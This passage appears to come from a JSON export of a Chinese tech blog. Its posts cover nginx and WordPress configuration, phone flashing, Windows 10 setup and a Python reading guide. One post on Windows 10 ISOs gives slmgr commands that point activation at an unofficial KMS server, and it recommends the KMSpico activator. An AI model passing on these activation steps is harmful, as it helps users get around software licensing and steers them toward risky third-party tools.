isset($_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;])// &amp;&amp; false !== strpos( strtolower($_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;]), &#x27;gzip&#x27;) &amp;&amp; ( $file = get_file($basepath . &#x27;/wp-tinymce.js.gz&#x27;) ) ) &#123;if ( isset($_GET[&#x27;c&#x27;]) &amp;&amp; 1 == $_GET[&#x27;c&#x27;] &amp;&amp; isset($_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;])&amp;&amp; ( $file = get_file($basepath . &#x27;/wp-tinymce.js&#x27;) ) ) &#123;// header(&#x27;Content-Encoding: gzip&#x27;);echo $file;&#125; else &#123;echo get_file($basepath . &#x27;/tiny_mce.js&#x27;);&#125;exit; 修改完后请将wp-tinymce.js.gz解压,得到wp-tinymce.js,将此文件传到空间对应位置就ok了.","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[]},{"title":"LNMP环境下_Nginx带宽限制","slug":"nginx-limit-zone","date":"2015-08-06T23:45:43.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"nginx-limit-zone.html","permalink":"https://sobaigu.com/nginx-limit-zone.html","excerpt":"","text":"Nginx下的带宽限制貌似比较简单，下面是我在两台VPS间的测试过程，测试机器用的是BlueVM的9.95美元年付OpenVZ，上个月手贱买的；用来拖数据的是DS2刀月付，很早很早以前花大价钱收来的啊，现在……遍地都是这种价位的！ 本文在LNMP一键包环境下测试的，主要修改有两处。 修改nginx默认配置文件，利用nginx的标准模块ngx_http_limit_zone_module，进行会话的并发连接数控制。 12#cd /usr/local/nginx/conf#vi nginx.conf 在http{}添加如下： limit_zone one $binary_remote_addr 10m; 我们在nginx.conf中可以看到一行如下： #limit_zone crawler $binary_remote_addr 10m; 开始，我只是去除了这行前面的#，解除注解，不过报错，crawler必须替换成one。关于上面这行添加的内容，他主要是定义一个叫one的记录区，总容量为 10M，以变量 $binary_remote_addr 作为会话的判断基准。 为了测试，我解析了一个域名，并在VPS中添加了这个域名主机。接下来，我们需要修改第二次，就是这个域名配置文件。 #cd /usr/local/nginx/conf/vhost #vi 域名.conf 添加一段： location / { limit_conn one 1; limit_rate 500k; } 这段表示每个客户端仅允许一个连接，限速为500KB/s。 全部修改之后，检查下配置文件和重载下nginx。 12#/usr/local/nginx/sbin/nginx –t#service nginx reload 其实这里我遇到一点报错，如下图，不过貌似没影响效果。 根据他这行报错，我修改过nginx.conf，可是按照他写的修改，直接配置文件检测都不通过，如果您知道怎样这个可以怎样处理掉，还请不吝赐教。 弄好之后，我放了个100MB测试文件，下图是效果，加了限制和不加限制的对比明显。 **【后记】**这个限制呢，他有一定的用处，比如自己的下载资源站之类的，但是，这并不能完全的控制盗链之类问题，我们可以用他的防盗链模块如ngx_http_referer_module，或者ngx_http_accesskey_module等，我们可以分析日志，对$http_user_agent进行匹配，然后返回503等等。 新的语法规则变了，需使用limit_conn_zone $variable zone=name:size;详见http://nginx.org/cn/docs/http/ngx_http_limit_conn_module.html","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"小米2s-MIUI_V6开发版刷回V5稳定版","slug":"miui-v6-to-v5","date":"2015-08-01T00:24:27.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"miui-v6-to-v5.html","permalink":"https://sobaigu.com/miui-v6-to-v5.html","excerpt":"小米2s一直闲置,偶尔会用来刷个系统玩玩,就是2s上尝试刷了MIUI V6的开发版,本想体验下Android5.1所谓的内存优化控制. 因为是闲置手机,用的也不多,但感觉Android5也不过如此,就又想刷回V5版,可问题是没那么容易刷回来… 本来刷V6的时候,原先的分区不合适,所以刷如V6开发版后,2s的分区是进行了合并的,此时再用小米助手的线刷或者卡刷都没法直接刷成功.用小米助手线刷时,会一直卡在fastboot那个界面,其实是有错误的,但这个错误不会表现出来,然后你就在哪等啊等,那个拿螺丝刀的米兔就那样安静地坐在那,不出一声…","text":"小米2s一直闲置,偶尔会用来刷个系统玩玩,就是2s上尝试刷了MIUI V6的开发版,本想体验下Android5.1所谓的内存优化控制. 因为是闲置手机,用的也不多,但感觉Android5也不过如此,就又想刷回V5版,可问题是没那么容易刷回来… 本来刷V6的时候,原先的分区不合适,所以刷如V6开发版后,2s的分区是进行了合并的,此时再用小米助手的线刷或者卡刷都没法直接刷成功.用小米助手线刷时,会一直卡在fastboot那个界面,其实是有错误的,但这个错误不会表现出来,然后你就在哪等啊等,那个拿螺丝刀的米兔就那样安静地坐在那,不出一声… 尝试多次后,我把最终的方法(其实也很简单)记录如下: 安装小米的线刷工具MiFlash MiFlash下载地址:http://bigota.d.miui.com/tools/MiPhone50327.exe,安装就不说了. 下载V5完整包 miui各机型完整版见:http://www.miui.com/shuaji-393.html,下载完成后将完整包解压好. 开始刷机 完整包下载完成后双击运行解压，打开完整包文件夹，复制地址栏地址如下图。 刷机工具下载完成后解压并安装（如遇到系统安全提示请选择允许安装），打开MiFlash.exe将复制的内容粘贴到蓝色区域位置。 在手机上操作:关机状态下，同时按住音量下键和电源键,或按住音量下键重启进入Fastboot模式将手机USB连接电脑。 通过快捷键ctrl+a键打开设置按钮,fastboot脚本选择xxx\\flash_all_except_storage.bat此时点击黄色圈选部分刷新，刷机程序会自动识别手机，点击红色圈选部分刷机开始刷机。 然后等待，如下图表示已经刷机成功，手机会自动开机。 如果开不了机了，充不了电点不亮了看下这里：红米note移动特别版起死回生记 小米助手 如果觉着以上方法麻烦，可以先尝试小米助手，如果不行或者要救砖了那就只能按照以上方法来完成了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"手机","slug":"手机","permalink":"https://sobaigu.com/tags/%E6%89%8B%E6%9C%BA/"}]},{"title":"Windows10正式版ISO下载","slug":"win10iso","date":"2015-07-30T22:28:49.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"win10iso.html","permalink":"https://sobaigu.com/win10iso.html","excerpt":"","text":"Windows10正式版来了 2015年7月29日中午，微软操作系统Windows 10RTM正式版已全球发布！所有分支渠道现在都可以获取推送直接更新，也可以直接到微软官方资源中心下载ISO镜像安装，Win10正式版包括专业版、家庭版、企业版和教育版。值得注意的是，Windows10操作系统只在第一年内免费升级，严格来说盗版Win7/8.1是不能免费升级到Windows 10的，即便是现在收到了升级提示，在升级过程中检测到盗版之后是会中断升级。 Windows 10 各版本区别 家庭版：供家庭用户使用，无法加入Active Directory和Azure AD，不允许远程链接； 专业版：供小型企业使用，在家庭版基础上增加了域账号加入、bitlocker、企业商店等功能； 企业版：供中大型企业使用，在专业版基础上增加了DirectAccess，AppLocker等高级企业功能； 教育版：供学校使用 (学校职员、管理人员、老师和学生) 其功能几乎和企业版一样，针对学校授权而已； LTSB版：无Edge浏览器、小娜，无磁铁，可选是否下载和安装补丁，其它版都不能自选补丁，适合办公！ Windows 10 所有版本 KMS激活密钥 KMS激活密钥 （Win10KMS全版本自动激活批处理下载） 专业版KMS： W269N-WFGWX-YVC9B-4J6C9-T83GX 企业版KMS： NPPR9-FWDCX-D2C8J-H872K-2YT43 家庭版KMS：TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 教育版KMS：NW6C2-QMPVW-D7KKK-3GKT6-VCFB2 KMS激活命令：以管理员身份运行CMD（命令提示符） 1234slmgr /upkslmgr /ipk xxxxx-xxxxx-xxxxx-xxxxx-xxxxxslmgr /skms kms.xspace.inslmgr /ato Windows 10正式版全新安装方式激活工具推荐 强大国外流行，知名激活神器：KMSpico 最新版 Windows 10 微软官方简体中文正式版ISO镜像下载 MSDN, 我告诉你下载中心：http://msdn.itellyou.cn Windows 10 官方简体中文正式版64位 专业版/家庭版 Windows 10 (Multiple Editions) (x64) - DVD (Chinese-Simplified) 文件名： cn_Windows_10_multiple_editions_x64_dvd_6848463.iso SHA1： C71D49A6144772F352806201EF564951BE55EDD5 发布日期： 2015-07-29 文件大小：4.01GB ed2k://|file|cn_Windows_10_multiple_editions_x64_dvd_6848463.iso|4303300608|94FD861E82458005A9CA8E617379856A|/ Windows 10 官方简体中文正式版32位 专业版/家庭版 Windows 10 (Multiple Editions) (x86) - DVD (Chinese-Simplified) 文件名： cn_Windows_10_multiple_editions_x86_dvd_6846431.iso SHA1： 21B824F402927E76C65160B62EB8A4EBBABE9C6E 发布日期： 2015-07-29 文件大小：3.01GB ed2k://|file|cn_Windows_10_multiple_editions_x86_dvd_6846431.iso|3233482752|B5C706594F5DC697B2A098420C801112|/ Windows 10 官方简体中文正式版64位 企业版 Windows 10 Enterprise (x64) - DVD (Chinese-Simplified) 文件名： cn_Windows_10_enterprise_x64_dvd_6846957.iso SHA1： 071A2B6CB634D46E12DC2B287DCFDB737A615281 发布日期： 2015-07-29 文件大小：3.88GB ed2k://|file|cn_Windows_10_enterprise_x64_dvd_6846957.iso|4162242560|3F657E387CD65FE7BA69DACAAE0E3510 Windows 10 官方简体中文正式版32位 企业版 Windows 10 Enterprise (x86) - DVD (Chinese-Simplified) 文件名： cn_Windows_10_enterprise_x86_dvd_6846962.iso SHA1： 83797D3477E3E5346F804D65E46EF227A4535B1D 发布日期： 2015-07-29 文件大小：2.89GB ed2k://|file|cn_Windows_10_enterprise_x86_dvd_6846962.iso|3100794880|B605D57635502A46B86ACC73764CCD9A Windows 10 官方简体中文正式版64位 教育版 Windows 10 Education (x64) - DVD (Chinese-Simplified) 文件名： cn_Windows_10_education_x64_dvd_6847843.iso SHA1： C948D930E229AB277AAFF9233CBD46F125AAC179 发布日期： 2015-07-29 文件大小：3.87GB ed2k://|file|cn_Windows_10_education_x64_dvd_6847843.iso|4159854592|50A2126871A73D48FAE49D7D928D5343|/ Windows 10 官方简体中文正式版32位 教育版 Windows 10 Education (x86) - DVD (Chinese-Simplified) 文件名： cn_Windows_10_education_x86_dvd_6847858.iso SHA1： F5E5B26C03180D492E32872B5D0E16DCFC134DA8 发布日期： 2015-07-29 文件大小：2.88GB ed2k://|file|cn_Windows_10_education_x86_dvd_6847858.iso|3097344000|E65D0B95FC75EC17FA6E72DC7433B46F|/ Windows 10 官方简体中文正式版64位 企业版 2015 LTSB Windows 10 Enterprise 2015 LTSB (x64) - DVD (Chinese-Simplified) 文件名： cn_Windows_10_enterprise_2015_ltsb_x64_dvd_6848425.iso SHA1： 179A95E6A498EFE079FB1817D1ADF5A3B7793B4D 发布日期： 2015-07-29 文件大小：3.64GB ed2k://|file|cn_Windows_10_enterprise_2015_ltsb_x64_dvd_6848425.iso|3907538944|38E47AB92B6D97DF2BE602BBC9969D34|/ Windows 10 官方简体中文正式版32位 企业版 2015 LTSB Windows 10 Enterprise 2015 LTSB (x86) - DVD (Chinese-Simplified) 文件名： cn_Windows_10_enterprise_2015_ltsb_x86_dvd_6848426.iso SHA1： B0181D56B7C699890B69A21E77EDA40884F3CF24 发布日期： 2015-07-29 文件大小：2.69GB ed2k://|file|cn_Windows_10_enterprise_2015_ltsb_x86_dvd_6848426.iso|2887350272|681C2F80A511FCEC73B7A5D878D4D9EC|/","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Windows10正式版必要设置","slug":"do-for-windows-10","date":"2015-07-26T00:35:55.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"do-for-windows-10.html","permalink":"https://sobaigu.com/do-for-windows-10.html","excerpt":"","text":"Windows10正式版来了 2015年7月29日中午，微软操作系统Windows 10RTM正式版已全球发布！所有分支渠道现在都可以获取推送直接更新，也可以直接到微软官方资源中心下载ISO镜像安装，Win10正式版包括专业版、家庭版、企业版和教育版。值得注意的是，Windows10操作系统只在第一年内免费升级，严格来说盗版Win7/8.1是不能免费升级到Windows 10的，即便是现在收到了升级提示，在升级过程中检测到盗版之后是会中断升级。 Windows 10必要设置 系统安装完成后,有一些默认设置明显不适合国人习惯,有必要对其进行一些重新设置，博客贴图回头一堆麻烦，我还是直接文字记录吧，相信文字也能表达清楚。 系统激活 第一步当然是激活系统了,如果未激活状态,Windows10根本不给你设置的权限.关于系统激活话不多说,见http://www.heu8.com/2752.html. 此工具应该还存在一些瑕疵,如果首页那个一键激活失败,请选择附加&gt;手动第一步&gt;第二步就可以激活了. 输入法 我们装的一般是中文版系统,安装时如果你选择的是微软拼音,那么进入系统后,默认输入法为中文状态,和Windows8设置默认输入法为英文一样,这种设置真的没考虑过实际使用,我们需要将其设置为默认英文状态。 开始&gt;设置&gt;时间和语言&gt;区域和语言,可以看到语言下有个中文(中华人民共和国),点击此内容,会显示一个选项&gt;键盘&gt;微软拼音&gt;点击&quot;微软拼音&quot;,继续显示选项&gt;中英文输入切换&gt;选择IME默认模式:英文 请注意，上面的时间和语言是从开始&gt;设置进去的那个设置里，打完某系统补丁后点击右下角输入法托盘那个语言首选项进入也行,从控制面板进入的时间和语言里是看不到输入法选项入口的。另外,针对个人输入风格,Windows提供是否单独程序单独设置输入法. 1控制面板&gt;更换输入法&gt;左侧的&quot;高级设置&quot;&gt;允许我为每个应用设置不同的输入法 此处如果勾选,则当你在chrome里使用中文时,再开一个cmd窗口会使用默认英文输入法,不勾选则所有程序使用之前已经在使用的输入法. 微软的输入法在自动联想及准确性上大打折扣，尤其是删除键后的输入规则，也找不到在哪可以设置，伤透脑筋。 所以,还是建议安装搜狗等熟悉民情的输入法.利用搜狗的输入法管理器,给系统添加一个默认的美式键盘用来默认输入英文,剩下的微软输入法就可以删除掉了. 经过以上设置，也算大功告成吧!设置个输入法好累! 解决无法打开这个应用 当你使用administrator登陆计算机时,打开浏览器等会提示: 无法打开这个应用 无法使用内置管理员账户打开Microsoft Edge.请使用其他账户登陆,然后再试一次 此时,我们打开组策略编辑器,按Win+R快捷调出运行窗口,在输入框输入gpedit.msc回车即可打开组策略编辑器.在组策略编辑器展开到: 计算机配置&gt;Windows设置&gt;安全设置&gt;本地策略&gt;安全选项,在右侧找到:用户帐户控制:用于内置管理员账户的管理员批注模式,该设置默认是已禁用状态,双击改成已启用后保存退出,此更改需要注销或重启才能生效. 任务栏搜索 安装完成后会在任务栏左侧有一个大大的搜索框,把任务栏位置占了快一半了,在任务栏上右键&gt;搜索&gt;勾选隐藏或显示搜索图标. 开始菜单 开始菜单个人认为win8下的那种metro风格挺好的，可惜微软为了屈服广大草民，就来了个XP和win8合体，倒觉着有点不伦不类。在以前的版本中还可以在任务栏属性进去选择开始菜单的风格，10240之后版本则可以通过以下方法设置为全屏开始菜单. 1设置&gt;个性化(或者桌面直接右键个性化进入)&gt;开始&gt;使用全屏幕&quot;开始&quot;菜单:设置为开 对现有开始菜单上，选择那些垃圾此贴右键隐藏或删除，把自己要的程序固定到开始屏幕即可。 当然，开始屏幕上那些快捷是可以分类的，自行研究。如果有强迫症,觉着有些不提供卸载的应用只是隐藏不爽,那你可以通过以下命令来处理. 在开始菜单里搜索power,此时应该会搜索到&quot;Windows PowerShell&quot;,右键&gt;以管理员身份运行. 接下来需要用到Get-AppxPackage和Remove-AppxPackage这两个命令. Get-AppxPackage查询已安装的应用,以下是示例 123456789101112131415161718192021222324252627282930PS C:\\Windows\\system32&gt; Get-AppxPackage -AllUsersName : Microsoft.BingSportsPublisher : CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=USArchitecture : X86ResourceId :Version : 4.3.193.0PackageFullName : &lt;span style=&quot;color: #ff0000;&quot;&gt;Microsoft.BingSports_4.3.193.0_x86__8wekyb3d8bbwe&lt;/span&gt;InstallLocation : C:\\Program Files\\WindowsApps\\Microsoft.BingSports_4.3.193.0_x86__8wekyb3d8bbweIsFramework : FalsePackageFamilyName : Microsoft.BingSports_8wekyb3d8bbwePublisherId : 8wekyb3d8bbwePackageUserInformation : &#123;S-1-5-18 [S-1-5-18]: Staged&#125;IsResourcePackage : FalseIsBundle : FalseIsDevelopmentMode : FalseName : Microsoft.SkypeAppPublisher : CN=Skype Software Sarl, O=Microsoft Corporation, L=Luxembourg, S=Luxembourg, C=LUArchitecture : X86ResourceId :Version : 3.2.1.0PackageFullName : Microsoft.SkypeApp_3.2.1.0_x86__kzf8qxf38zg5cInstallLocation : C:\\Program Files\\WindowsApps\\Microsoft.SkypeApp_3.2.1.0_x86__kzf8qxf38zg5cIsFramework : FalsePackageFamilyName : Microsoft.SkypeApp_kzf8qxf38zg5cPublisherId : kzf8qxf38zg5cPackageUserInformation : &#123;S-1-5-21-1405384239-473006511-2118542433-1001 [S-1-5-21-1405384239-473006511-2118542433-1001]: Installed, S-1-5-21-1405384239-473006511-2118542433-500 [Administrator]: Installed&#125;IsResourcePackage : FalseIsBundle : FalseIsDevelopmentMode : False 查询所有用户安装应用命令会列出所有已安装的应用,找到需要删除的应用信息,然后使用Remove-AppxPackage命令将其删除. 命令格式为Remove-AppxPackage PackageFullName,比如需要卸载微软体育,那么只需要输入之前查询到的应用全名,命令如下: 1Remove-AppxPackage Microsoft.BingSports_4.3.193.0_x86__8wekyb3d8bbwe 很多人不习惯metro风格的开始菜单,是因为很多xp下的开始菜单入口找不到了…其实你只需要在左下角开始图标上右键,那些东西都在那里,只是你点不点的问题. 我的电脑 默认打开资源管理器展示的是快速访问,CTRL+E打开的也这样,这些东西真是不习惯,我们将其改成默认打开熟悉的我的电脑显示磁盘分区这些. 1打开资源管理器(随便打开个文件夹,此电脑啥的)&gt;点上面的&quot;查看&quot;标签&gt;右侧&quot;选项&quot;&gt;跳出的&quot;文件夹选项&quot;上面有个&quot;打开文件资源管理器时打开&quot;&gt;选择&quot;此电脑&quot; 确定退出,再点开资源管理器,还是熟悉的我的电脑.还有左侧此电脑下边的视频，图片…这些目录导航，平常根本用不到，还影响打开盘符操作方便性，回头再研究怎么去掉。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"LNMP环境中_WordPress程序伪静态_解决方案","slug":"lnmp-for-wordpress","date":"2015-07-23T00:21:53.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"lnmp-for-wordpress.html","permalink":"https://sobaigu.com/lnmp-for-wordpress.html","excerpt":"","text":"LNMP环境是目前我们国内站长使用的Linux VPS配置环境中使用较多的。作为新手我们很可能会依葫芦画瓢的去安装VPS。我们是否有发现环境中我们较为常用的WordPress伪静态不生效，内页出现404错误页面。这个问题很好解决，因为我们lnmp采用的是nginx，而不是apache，所以不如apache直接丢htaccess文件到网站根目录就可以生效伪静态。 首先，默认安装的lnmp环境中已经有伪静态文件WordPress.conf文件在/usr/local/nginx/conf/WordPress.conf中，我们可以核对一下里面的编译代码是不是为： 123456789if (-f $request_filename/index.html)&#123;rewrite (.*) $1/index.html break;&#125;if (-f $request_filename/index.php)&#123;rewrite (.*) $1/index.php;&#125;if (!-f $request_filename)&#123;rewrite (.*) /index.php;&#125; 如果不是，我们需要修改成上面的代码文件用来rewrite跳转伪静态。 其次，我们需要在属于我们网站的配置文件： /usr/local/nginx/conf/vhost/sobaigu.com.conf(自己添加域名自动命名) 我们会看到类似下面的代码，看到红色部分是我添加进去的，你就添加进去就可以： server { listen 80; server_name sobaigu.com; index index.html index.php; include WordPress.conf; 最后，我们用ssh登录VPS，然后用下面的命令重启lnmp /root/lnmp restart 执行上面三步骤之后，我们是不是已经解决了伪静态问题，其他常用的CMS也是一样的，在默认的conf下基本都包含我们所需要的CMS伪静态编译脚本。最后顺带提一下，有朋友需要用到 301跳转的，比如只用到WWW域名作为主域名，可以参考设置301重定向的方法解决。 上文转自: http://www.laozuo.org/490.html | 老左博客 如果是Apache,那么通过.htaccess文件设置WordPress伪静态. apache设置WordPress伪静态我们可以在网站的更目录下建立.htaccess文件来实现,在.htaccess添加如下代码(无需重启服务器): RewriteEngine On RewriteBase / RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule . /index.php [L]","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"python入门导引","slug":"python-guide","date":"2015-07-18T04:55:33.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"python-guide.html","permalink":"https://sobaigu.com/python-guide.html","excerpt":"Python简介 python是一种面向对象的解释性的计算机程序设计语言，也是一种功能强大而完善的通用型语言，已经具有十多年的发展历史，成熟且稳定，属于OpenSource的项目。Python 具有脚本语言中最丰富和强大的类库，足以支持绝大多数日常应用。这种语言具有非常简捷而清晰的语法特点，适合完成各种高层任务，几乎可以在所有的操作系统中运行。Python 可以是简单的脚本，也可以是大型的复杂程序。事实上，Python 解释器的最大特点是鼓励探索和简化学习过程。","text":"Python简介 python是一种面向对象的解释性的计算机程序设计语言，也是一种功能强大而完善的通用型语言，已经具有十多年的发展历史，成熟且稳定，属于OpenSource的项目。Python 具有脚本语言中最丰富和强大的类库，足以支持绝大多数日常应用。这种语言具有非常简捷而清晰的语法特点，适合完成各种高层任务，几乎可以在所有的操作系统中运行。Python 可以是简单的脚本，也可以是大型的复杂程序。事实上，Python 解释器的最大特点是鼓励探索和简化学习过程。 Python的设计哲学是“优雅”、“明确”、“简单”。设计者开发时总的指导思想是，对于一个特定的问题，只要有一种最好的方法来解决就好了。这在由Tim Peters写的python格言（称为The Zen of Python）里面表述为： There should be one-- and preferably only one --obvious way to do it. 这正好和Perl语言（另一种功能类似的高级动态语言）的中心思想TMTOWTDI（There’s More Than One Way To Do It）完全相反。 Python一瞥： Python精要 python十分钟入门 Python 二三事 A Very Brief Introduction to Python And its Data-Types 五分钟入门神图](http://wiki.woodpecker.org.cn/moin/ZqQuickIntoPy) 快速学习 IBM的入门教程:Discover Python 探索Python(doc)： 探索 Python，第 1 部分: Python 的内置数值类型(简单类型) 探索 Python，第 2 部分: 探索 Python 类型的层次结构(容器类型：元组 tuple) 探索 Python，第 3 部分: 探索 Python 类型的层次结构(容器类型：字符串 string) 探索 Python，第 4 部分: 探索 Python 类型的层次结构(容器类型：列表 list) 探索 Python，第 5 部分: 用 Python 编程(if语句，while循环) 探索 Python，第 6 部分: 用 Python 编程(for循环) 探索 Python，第 7 部分: 探索 Python 类型层次结构(容器类型：字典 dictionary) 探索 Python，第 8 部分: 用 Python 的输入输出功能读取和写入数据 探索 Python，第 9 部分: 化零为整 更新丰富的系列博文 简明Python教程系列： 简明python教程 --C++程序员的视角（一）：数值类型、字符串、运算符和控制流 简明python教程 --C++程序员的视角（二）：函数 简明python教程 --C++程序员的视角（三）：模块 简明python教程 --C++程序员的视角（四）：容器类型（字符串、元组、列表、字典）和参考 简明python教程 --C++程序员的视角（五）：面向对象的编程 简明python教程 --C++程序员的视角（六）：输入输出 简明python教程 --C++程序员的视角（七）：异常 简明python教程 --C++程序员的视角（八）：标准库 简明python教程 --C++程序员的视角（九）：进阶用法 Python速查系列： Python变量和对象类型速记手册 Python正则表达式集锦 The python debugger(PDB)的简介 Python绘图系列: Python图像处理库PIL – 学习资源 Python图像处理库(PIL)–简介和基本概念 Python图像处理库(PIL)–Image,ImageDraw等基本模块介绍 纪伯伦小诗：PIL多图合并DIY桌面 Python图表绘制：matplotlib绘图库入门 进阶学习 Google’s Python Class | Understanding Python 国内下载地址 翻译（谷歌Python课程导读，安装Python，Python简介，Python 字符串） MIT公开课：计算机科学及编程导论（Python教学） 两个Python中文社区： 啄木鸟Python开源社区 python中国 Python 语言研究：关注 Python 本身语言、语法的研究和探讨，收集整理相关的文档和心得（尤其是中文资料） 开始学习python , 如何成为 Python 高手 Python视频教程 Python图书推荐 Python图书概览：Python 安装包中附带的官方文档永远是最有价值的资料之一；书不必贪多，精读三五本好书，胜过藏书万卷 python 入门书籍推荐, 三本可以一买的 Python 书 对于语言特性的学习来说，特别推荐前几本： （8.6分/144）Python入门指南《Python Tutorial》（中英对照版，简体中文版） – 最新，最权威，公开文档 如果你想在最短的时间内就了解python的最基础使用, 那么不妨花几个小时时间看看这份官方的python入门教材，最权威的 Python 教程，由 Python 作者 Guido van Rossum 主笔，有少许学院味道。 （8.8分/492）简明python教程《A Byte of Python》（英文、中文译本、CHM打包文档下载） 简洁明了，浅显易懂，公开文档，由浅入深讲述了python的方方面面内容, 适合对python快速入门，即使没有编程基础也可阅读。 （8.7分/159）Python Cookbook —— 编程惯例 以实例学习为主，覆盖面较广但不会太深入，主要针对水平在初学者之上的读者（已经熟悉 Python 的基本语法） Google的python编码规范 中文 ，英文 下面的文章给你描述了一个最小的应该遵守的规范合集。如果按照这些指导原则，你将能编写出更简洁和漂亮的代码。作为附加效应，你的程序会变得可读性更好，更容易的被你和任何其他人修改。 http://www.python.org/dev/peps/pep-0008/ http://www.fantascienza.net/leonardo/ar/python_best_practices.html Some Popular Python Articles Python的八荣八耻 以动手实践为荣， 以只看不练为耻。 以打印日志为荣， 以单步跟踪为耻。 以空白分隔为荣， 以制表分隔为耻。 以单元测试为荣， 以手工测试为耻。 以代码重用为荣， 以复制粘贴为耻。 以多态应用为荣， 以分支判断为耻。 以Pythonic为荣，以冗余拖沓为耻。 以总结思考为荣， 以不求甚解为耻。 Python的安装和函数库 推荐使用IDE python(x,y),发布的Python(x,y)将近400M，收集了众多的函数库以及文档、教程。这也是《用Python做科学计算》一书中推荐的（文）。 Python二三事： “发行版附带了科学计算方面的很多常用库，另外还有大量常用库比如用于桌面软件界面制作的PyQt, 还有文档处理，exe文件生成py2exe等常用库。另外的还有大量的工具如IDE，制图制表工具，加强的shell之类。很多下文提到的软件在此发行版中都有附带。其他方面，Python(x, y)还附带了手工整理出的所有库的离线文档，每个小版本升级都提供单独的补丁。总的来说是很用心维护的一个发行版，十分建议安装这个版本。” “在真正着手开发之前，你应该在下载一份离线的文档。在这个页面下载一份 HTML 格式的（打不开的话试试这里），解压出来其中 index.html 就是文档主页面。页面左边的 Quick Search 是离线也可以使用的，有对函数功能有疑惑或者要查询模块的时候就能在这里查看。”(python(x,y)自带这个python文档 ) Python(x,y) has five main features: collecting scientific-oriented Python libraries and development environment tools ; collecting almost all free related documentation ; providing a quick guide to get started in Python / Qt / Spyder ; providing an all-in-one setup program, so the user can install or uninstall all these packages and features by clicking on one button only. Python(x,y) was created for : rapid prototyping, using the enhanced Python shell known as IPython ; small/big projects (application-like) development, using Spyder - a powerful and interactive cross-platform Integrated Development Environment (IDE) ; scientific purpose: scientific computing, numerical simulations, signal processing, image processing, physics (experiments and modeling), engineering, … 安装后有ipython(interactive console,豪华加强版python shell)和spyder(这个powerful scientific IDE类似matlab，而IDLE是Python作者提供的简单Python开发环境)这两个常用工具。 python数值计算库：NumPy为Python提供了快速的多维数组处理的能力，而SciPy则在NumPy基础上添加了众多的科学计算所需的各种工具包，有了这两个库，Python就有几乎和Matlab一样的处理数据和计算的能力了。 NumPy为Python带来了真正的多维数组功能，并且提供了丰富的函数库处理这些数组。它将常用的数学函数都进行数组化，使得这些数学函数能够直接对数组进行操作，将本来需要在Python级别进行的循环，放到C语言的运算中，明显地提高了程序的运算速度。 SciPy的核心计算部分都是一些久经考验的Fortran数值计算库，例如： 线性代数使用LAPACK库 快速傅立叶变换使用FFTPACK库 常微分方程求解使用ODEPACK库 非线性方程组求解以及最小值求解等使用MINPACK库 Python的特点 Python对函数式编程只提供了有限的支持（相对于Lisp这种传统的函数式编程语言）。有两个标准库(functools, itertools)提供了Haskell和Standard ML中久经考验的函数式编程工具。 Python的支持者较喜欢称它为一种高阶动态编程语言（虽然Python可能被粗略地分类为「脚本语言」（script language），但实际上一些大规模软件开发计划例如Zope、Mnet及BitTorrent，Google也广泛地使用它），原因是「脚本语言」泛指仅作简单编程任务的语言，如shell script、JavaScript等只能处理简单任务的编程语言，並不能与Python相提并论。 很多人还把Python作为一种「胶水语言」（glue language）使用（Python本身被设计为可扩展的。并非所有的特性和功能都集成到语言核心。可以使用C语言、C++、Cython来编写扩展模块。Python解释器本身也可以被集成到其它需要脚本语言的程序内）。使用Python将其他语言编写的程序进行集成和封装。在Google内部的很多项目使用C++编写性能要求极高的部分，然后用Python调用相应的模块。 作者有意的设计限制性很强的语法，使得不好的编程习惯（例如if语句的下一行不向右缩进）都不能通过编译。这样有意的强制程序员养成良好的编程习惯。其中很重要的一项就是Python的_缩进规则_：C++等语言是以{}来管理块的，而Python是以缩进来管理的。这样做的确有他的优越性。相信许多程序员都有过漏去{}的经历。如果，使用的编译器或者解释器优秀的话，你的确可以非常容易的加上漏去的{}。但是，如果不是这样，我想你会在复杂的代码中开始漫游了。因为，可能你的编译器会告诉你一个错误的错误信息，这个错误的位置可能会离你真正错误的地方很远（大概有十万八千里吧）。相对于此，以缩进管理方式的Python来说，程序员几乎不用考虑这种问题。其次以缩进方式区分块的Python在进行复杂的嵌套中，Python代码就显得明了许多了。 对于Python的代码类型，基本可分为3种，分别是字节代码，二进制代码，优化代码。他们的后缀名分别是.py .pyc .pyo 这些代码都可以直接运行，无需做任何的编译或者连接。Python在执行时，Python解释器会将源代码（.py文件）成字节码byte code（.pyc文件）这种中间形式，然后再由Python Virtual Machine来执行这些byte code。和Java 或.NET相比，Python的Virtual 